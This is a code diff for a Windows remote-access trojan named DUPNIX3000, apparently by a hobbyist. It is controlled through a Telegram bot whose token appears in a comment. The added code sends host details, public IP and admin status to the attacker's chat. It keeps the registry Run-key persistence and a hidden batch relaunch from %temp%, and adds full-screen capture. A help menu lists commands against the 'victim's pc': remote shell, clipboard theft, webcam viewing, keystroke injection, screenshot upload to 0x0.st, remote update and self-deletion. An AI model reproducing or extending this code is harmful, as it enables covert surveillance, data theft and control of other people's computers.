@@ -9,41 +9,44 @@
 #include <winternl.h>
 #include <winsock.h>
 #include <iomanip>
+#include <opencv2/opencv.hpp>
 #include <nlohmann/json.hpp>
 #include <cpr/cpr.h>
 #pragma comment(lib, "Shlwapi.lib")
 
 using namespace std;
 using json = nlohmann::json;
+using namespace cv;
 
 string ID;
-const string botApi = "1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664"; //https://api.telegram.org/bot1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664/getUpdates
-const string chat_id = "-1001487776950";
+const string botApi = ""; //https://api.telegram.org/bot1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664/getUpdates
+const string chat_id = "-1001655582641";
+const string VERSION = "beta v0.2.4";
+const vector <string> constants = { "$UPTIME$","$EXE_NAME$","$HOST_NAME$","$PUBLIC_IP$","$ADIMN_RIGHTS$","$EXE_PATH$","$CURRENT_VOLUME$","$CURSOR_POSITION$","$VERSION$" };
 
 inline bool filexits(const string& name) {
     struct stat buffer;
     return (stat(name.c_str(), &buffer) == 0);
 }
 
-json GetLastMessage()
-{
+json GetLastMessage(){
     auto response = cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + botApi + "/getUpdates?last=1&offset=-1" });
     string s = response.text;
-    s = s.substr(21, s.size() - 23);
-    if (s.empty()) {
+    if(!s.empty())  s = s.substr(21, s.size() - 23);
+    if(s.empty() || s=="\n") {
         json jd;
         jd["message_id"] = 69;
         jd["date"] = -1;
         return jd;
     }
+
     json j = json::parse(s);
     j = j["channel_post"];
     return j;
 }
 
-bool ChangeVolume(double nVolume, bool bScalar)
+int ChangeVolume(double nVolume=-1, bool bScalar=0)
 {
-
     HRESULT hr = 0;
     bool decibels = false;
     bool scalar = false;
@@ -69,7 +72,7 @@ bool ChangeVolume(double nVolume, bool bScalar)
     endpointVolume->GetMasterVolumeLevel(&currentVolume);
 
     hr = endpointVolume->GetMasterVolumeLevelScalar(&currentVolume);
-
+    if (nVolume == -1)newVolume = currentVolume;
     if (bScalar == false)
     {
         hr = endpointVolume->SetMasterVolumeLevel((float)newVolume, NULL);
@@ -82,8 +85,9 @@ bool ChangeVolume(double nVolume, bool bScalar)
 
     CoUninitialize();
 
-    return FALSE;
+    return currentVolume*100;
 }
+
 
 void setID(string newID)
 {
@@ -112,50 +116,6 @@ inline void press(char a, bool bigone = 0)
 }
 
 
-void TakeScreenShot(const std::string& path)
-{
-    //setting to the screen shot
-    keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
-    keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
-    Sleep(5);
-    keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
-    keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
-
-    //handler of the bitmap that save the screen shot
-    HBITMAP hBitmap;
-
-    //I have to give for it time to make it work
-    Sleep(500);
-
-    //take the screen shot
-    OpenClipboard(NULL);
-
-    //save the screen shot in the bitmap handler 
-    hBitmap = (HBITMAP)GetClipboardData(CF_BITMAP);
-    CloseClipboard();
-
-    std::vector<BYTE> buf;
-    IStream* stream = NULL;
-    HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
-    CImage image;
-    ULARGE_INTEGER liSize;
-
-    // screenshot to jpg and save to stream
-    image.Attach(hBitmap);
-    image.Save(stream, Gdiplus::ImageFormatJPEG);
-    IStream_Size(stream, &liSize);
-    DWORD len = liSize.LowPart;
-    IStream_Reset(stream);
-    buf.resize(len);
-    IStream_Read(stream, &buf[0], len);
-    stream->Release();
-
-    // put the imapge in the file
-    std::fstream fi;
-    fi.open(path, std::fstream::binary | std::fstream::out);
-    fi.write(reinterpret_cast<const char*>(&buf[0]), buf.size() * sizeof(BYTE));
-    fi.close();
-}
 
 string get_exe() {
     //https://stackoverflow.com/questions/10814934/how-can-program-get-executable-name-of-itself
@@ -172,8 +132,8 @@ string get_path() {
     TCHAR buffer[MAX_PATH] = { 0 };
     DWORD bufSize = sizeof(buffer) / sizeof(*buffer);
     GetModuleFileName(NULL, buffer, bufSize);
-    
-    return buffer;
+    string buff = buffer;
+    return buff.substr(0,buff.size()-get_exe().size());
 }
 
 //https://stackoverflow.com/questions/154536/encode-decode-urls-in-c
@@ -201,7 +161,10 @@ string url_encode(const string& value) {
 }
 
 void Send(string to_send) {
-    cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + botApi + "/sendMessage?chat_id=" + chat_id + "&text=" + url_encode(to_send)});
+    while (!to_send.empty()) {
+        cpr::Response r = cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + botApi + "/sendMessage?chat_id=" + chat_id + "&text=" + url_encode(to_send.substr(0,4095)) });
+        to_send.erase(0, 4095);
+    }
 }
 
 string exec(const char* cmd) {
@@ -248,26 +211,54 @@ Cleanup:
     return fIsElevated;
 }
 
+string uptime() {
+    int uptime_h = ((double)clock()) / CLOCKS_PER_SEC / 3600;
+    int uptime_m = ((double)clock()) / CLOCKS_PER_SEC / 60;
+    uptime_m -= uptime_h * 60;
+    if (uptime_m < 0)uptime_m = 0;
+    return to_string(uptime_h) + "h" + to_string(uptime_m) + "m" + '\n';
+}
+
+string hostname() {
+    string buffer = exec("hostname");
+    buffer[buffer.size() - 1] = ' ';
+    return buffer;
+}
+
+string public_ip() {
+    auto response = cpr::Get(cpr::Url{ "https://myexternalip.com/raw" });
+    return response.text;
+}
+
+string admin_rights() {
+    return to_string(IsProcessElevated());
+}
+
+string Cursor_Position() {
+    POINT p;
+    GetCursorPos(&p);
+    return to_string(p.x) + " " + to_string(p.y);
+}
+
 string getStatus() {
     string status;
 
-    int uptime_h = ((double)clock())/CLOCKS_PER_SEC/3600;
-    int uptime_m = ((double)clock()) /CLOCKS_PER_SEC/60;
-    uptime_m -= uptime_h * 60;
-    if (uptime_m < 0)uptime_m = 0;
-    status = "uptime: " + to_string(uptime_h) + "h" + to_string(uptime_m) + "m" + '\n';
+    status = "uptime: " + uptime();
     status += "exe_name: " + get_exe() + '\n';
-    string buffer = exec("hostname");
-    buffer[buffer.size() - 1] = ' ';
-    status += "host_name: " + buffer + '\n';
-    auto response = cpr::Get(cpr::Url{ "https://myexternalip.com/raw" });
-    status += "public_ip: " + response.text + '\n';
-    status += "admin_rights: " + to_string(IsProcessElevated()) + '\n';
-    status += "exe_path: " + get_path();
+    status += "host_name: " + hostname() + '\n';
+    status += "public_ip: " + public_ip(); +'\n';
+    status += "admin_rights: " + admin_rights() + '\n';
+    status += "exe_path: " + get_path() + '\n';
+    status += "Current_volume: " + to_string(ChangeVolume()) + '\n';
+    status += "Cursor_Position: " + Cursor_Position(); + '\n';
+    
+    status += "\nversion: " + VERSION + '\n';
+
     return status;
 }
 
 string random_string(int lenght) {
+    srand(time(0));
     string random = "";
     while (lenght--) {
         char ran = rand() % 25 + 97;
@@ -293,7 +284,8 @@ void autostart() {
         file << "TASKKILL /F /IM " << get_exe() << endl
             << "move " << get_exe() << " %temp%" << endl
             << "move " << "shitoo" << " %temp%" << endl
-            << "start %temp%\\" + get_exe();
+            << "start %temp%\\" + get_exe() <<endl
+            << "exit";
         file.close();
         string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + random_string(16) + " /t REG_SZ /d %temp%\\" + get_exe();
         system(cmd.c_str());
@@ -305,7 +297,7 @@ void autostart() {
         file.open("shitoo", ios::out);
         file << buff2 + "o.bat";
         file.close();
-        system("o.bat");
+        system("start /min o.bat");
     }
     if (filexits(path + "\\shitoo")) {
         fstream file;
@@ -417,5 +409,144 @@ void logo() {
         << " / _` | | | | '_ \\| '_ \\| \\ \\/ / |_ \\| | | | | | | | | |" << endl
         << "| (_| | |_| | |_) | | | | |>  < ___) | |_| | |_| | |_| |" << endl
         << " \\__,_|\\__,_| .__/|_| |_|_/_/\\_\\____/ \\___/ \\___/ \\___/" << endl
-        << "            |_|" << endl;
+        << "            |_|         " + VERSION << endl;
 }      
+
+double time_lenght (time_t start, time_t stop) {
+    return (double)(stop - start) / CLOCKS_PER_SEC;
+}
+
+void atexit_handler() {
+    Send(ID + " error, quiting...");
+}
+
+void startup() {
+    logo();
+    fstream file;
+    file.open("ID.id");
+    file >> ID;
+    file.close();
+
+    if (ID.empty()) ID = "X";
+
+    Send(ID + " is running");
+    cout << "ID: " + ID << endl;
+
+    string s = get_path() + "update.bat";
+    if (filexits(s))remove(s.c_str());
+
+    atexit(atexit_handler);
+}
+
+void help(string parameters) {
+    if (parameters == "NULL") {
+        string help = "<ID> <command> <parameters>, you can use && when you want 2 commands in one message, e.g 420 SetCursor 1920,0 && Hotkey lmouse\n\n";
+        help += "Type <ID> help <command> for more specific info\nAll available commands: \n";
+        help += "Status\n";
+        help += "cmd <command>\n";
+        help += "SetCursor <X,Y>\n";
+        help += "BlockCursor <seconds>\n";
+        help += "Volume <0-100>, +<0-100>, -<0-100>, empty\n";
+        help += "BlockClipboard <true/fase> \n";
+        help += "SetID <ID>\n";
+        help += "Press <text>\n";
+        help += "SendClipboard\n";
+        help += "Screenshot\n";
+        help += "msgbox <\"Text\",number,\"Title\">\n";
+        help += "Hotkey <hotkey>\n";
+        help += "Taskkill <proccess name+.exe>\n";
+        help += "ProcessList\n";
+        help += "IsFileExits <path to file>\n";
+        help += "WebcamView\n";
+        help += "Sleep <seconds>\n";
+        help += "ErrorSound\n";
+
+        help += "Delitself\n";
+        help += "Update <link to new version>\n";
+        help += "help\n";
+
+        Send(help);
+    }
+    else {
+        if (parameters == "status") Send("It sends some info, uptime is uptime of dupnix, not pc");
+        else if (parameters == "cmd") Send("It works like a ssh");
+        else if (parameters == "SetCursor") Send("It sets cursor to X,Y position");
+        else if (parameters == "BlockCursor") Send("It blocks cursor at 0,0 for x seconds");
+        else if (parameters == "BlockClipboard") Send("Makes your victim's clipboard non usable");
+        else if (parameters == "Volume") Send("Sets volume in your victim's pc, you can increase/decrase using +/-, set it by number or just see actual volume");
+        else if (parameters == "SetID") Send("changes ID, defaultly it's X but you should change it to 420,69 etc");
+        else if (parameters == "Press") Send("Makes your victim's pc is writing your stuff e.g polish proverb \"Jebac Disa!\"");
+        else if (parameters == "SendCliboard") Send("Sends your victim's clipboard");
+        else if (parameters == "Screenshot") Send("Makes a screenshot, uploading it to 0x0.st and giving you link");
+        else if (parameters == "msgbox") Send("Makes a msgbox, you have to write it with \"s and ,s \navailable numbers: https://www.instructables.com/How-to-Make-a-message-box-using-VBScript/");
+        else if (parameters == "help") Send("Yes i did help for help, here's tutorial what it does: https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+        else if (parameters == "Hotkey") Send("usage is ctrl, ctrl+a, shift+alt+del+ins+a, etc. all keys: \nesc\ntab\ncapslock\nshift\nctrl\nwin\nalt\nralt\nspace\nenter\nbackspace\ndel\nf1\nf..12\nins\nhome\nend\npgdn\npgup\nuparrow\ndownarrow\nleftarrow\nrightarrow\nlmouse"); //It's so fucking big step bro
+        else if (parameters == "Delitself") Send("Deleting DUPNIX3000 from victim's pc");
+        else if (parameters == "Update") Send("Updating to newer version without access to victim's pc ");
+        else if (parameters == "Taskkill") Send("Kills a process");
+        else if (parameters == "ProcessList") Send("Sends you a list of all processes actually running");
+        else if (parameters == "IsFileExits") Send("Says if a file exits");
+        else if (parameters == "WebcamView") Send("Sends you webcam, if there's grey square it can means that something is wrong with webcam");
+        else if (parameters == "Sleep") Send("makes dupnix sleeping, commands are not working, may be useful e.g for \"Sleep 3600 && cmd shutdown /s\" when you want to shutdown pc in an hour");
+        else if (parameters == "ErrorSound") Send("Just makes windows error sound");
+        else Send("Wrong command.");
+    }
+}
+
+BITMAPINFOHEADER createBitmapHeader(int width, int height)
+{
+    BITMAPINFOHEADER  bi;
+
+    // create a bitmap
+    bi.biSize = sizeof(BITMAPINFOHEADER);
+    bi.biWidth = width;
+    bi.biHeight = -height;  //this is the line that makes it draw upside down or not
+    bi.biPlanes = 1;
+    bi.biBitCount = 32;
+    bi.biCompression = BI_RGB;
+    bi.biSizeImage = 0;
+    bi.biXPelsPerMeter = 0;
+    bi.biYPelsPerMeter = 0;
+    bi.biClrUsed = 0;
+    bi.biClrImportant = 0;
+
+    return bi;
+}
+
+Mat captureScreenMat(HWND hwnd)
+{
+    Mat src;
+
+    // get handles to a device context (DC)
+    HDC hwindowDC = GetDC(hwnd);
+    HDC hwindowCompatibleDC = CreateCompatibleDC(hwindowDC);
+    SetStretchBltMode(hwindowCompatibleDC, COLORONCOLOR);
+
+    // define scale, height and width
+    int screenx = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    int screeny = GetSystemMetrics(SM_YVIRTUALSCREEN);
+    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+
+    // create mat object
+    src.create(height, width, CV_8UC4);
+
+    // create a bitmap
+    HBITMAP hbwindow = CreateCompatibleBitmap(hwindowDC, width, height);
+    BITMAPINFOHEADER bi = createBitmapHeader(width, height);
+
+    // use the previously created device context with the bitmap
+    SelectObject(hwindowCompatibleDC, hbwindow);
+
+    // copy from the window device context to the bitmap device context
+    StretchBlt(hwindowCompatibleDC, 0, 0, width, height, hwindowDC, screenx, screeny, width, height, SRCCOPY);  //change SRCCOPY to NOTSRCCOPY for wacky colors !
+    GetDIBits(hwindowCompatibleDC, hbwindow, 0, height, src.data, (BITMAPINFO*)&bi, DIB_RGB_COLORS);            //copy from hwindowCompatibleDC to hbwindow
+
+    // avoid memory leak
+    DeleteObject(hbwindow);
+    DeleteDC(hwindowCompatibleDC);
+    ReleaseDC(hwnd, hwindowDC);
+
+    return src;
+}
+
